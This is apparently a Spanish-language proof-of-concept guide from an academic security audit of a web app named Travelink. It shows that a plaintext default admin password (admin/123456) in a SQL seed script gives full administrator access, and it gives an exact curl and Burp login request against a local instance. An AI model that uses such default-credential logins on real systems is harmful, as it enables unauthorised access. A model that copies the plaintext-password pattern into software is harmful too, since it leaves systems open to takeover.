# Guía de Prueba de Concepto: PoC-05 — Credencial de Administrador por Defecto en Texto Plano

**Vulnerabilidad:** H-02 — Credencial de Administrador en Texto Plano en `sql/datos_minimos.sql`  
**CWE:** CWE-259 (Use of Hard-coded Password) / CWE-521 (Weak Password Requirements)  
**OWASP Top 10:2021:** A07:2021 - Identification & Authentication Failures  
**Severidad:** Alta  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
En `sql/datos_minimos.sql:22-24`, el script que inicializa los datos mínimos del sistema inserta el usuario administrador con el nombre de usuario `'admin'` y la contraseña `'123456'` en texto plano (sin hash BCrypt). En conjunto con el bypass de `UsuarioServicioImpl.java:119-121` (que acepta contraseñas sin hash mediante comparación por igualdad directa), cualquier atacante puede iniciar sesión inmediatamente como superadministrador con la credencial pública por defecto `admin / 123456`.

---

## 2. Precondiciones
1. Base de datos inicializada con `sql/datos_minimos.sql`.
2. App local levantada en `http://127.0.0.1:8080`.

---

## 3. Procedimiento de Ejecución Manual (Request Exacta)

### Petición `curl` para Login de Administrador con Credencial por Defecto:
```bash
curl -i -s -X POST "http://127.0.0.1:8080/api/admin/login" \
     -H "Content-Type: application/json" \
     -d '{"usuario":"admin","clave":"123456","rolEsperado":"ADMIN"}'
```

### Formato para Burp Suite Repeater:
```http
POST /api/admin/login HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0
Content-Type: application/json
Accept: application/json
Content-Length: 59
Connection: close

{"usuario":"admin","clave":"123456","rolEsperado":"ADMIN"}
```

---

## 4. Respuesta Esperada
- **Código de Estado HTTP:** `200 OK`
- **Cabeceras:** `Set-Cookie: JSESSIONID=...; Path=/; HttpOnly`
- **Cuerpo de Respuesta (JSON):**
  ```json
  {
    "idUsuario": 1,
    "nombre": "Administrador Travelink Sistema",
    "correo": "admin@travelink.pe",
    "rol": "ROLE_ADMIN",
    "idAgencia": null
  }
  ```
- **Análisis de Seguridad:** El sistema concede una sesión de Administrador General (`ROLE_ADMIN`) utilizando la contraseña débil `'123456'` que se encontraba almacenada sin cifrar en la base de datos.

---

## 5. Qué Capturar para el Informe Académico
1. **Burp / Terminal:** Captura del inicio de sesión con `admin / 123456` devolviendo `HTTP 200 OK` con rol `ROLE_ADMIN` y la cookie `JSESSIONID`.
2. **Editor de Código:** Captura de `sql/datos_minimos.sql` en las líneas 22-24 mostrando la sentencia SQL `VALUES (1, 1, 3, 'admin', '123456', 'ACTIVO')`.
3. **Navegador Web:** Acceso a `http://127.0.0.1:8080/html/administrador/admin.html` utilizando la cookie obtenida, mostrando el panel de control administrativo activo.

---

## 6. Resultado Real (Completar tras la prueba)
*(Espacio reservado para el evaluador)*

```text

```
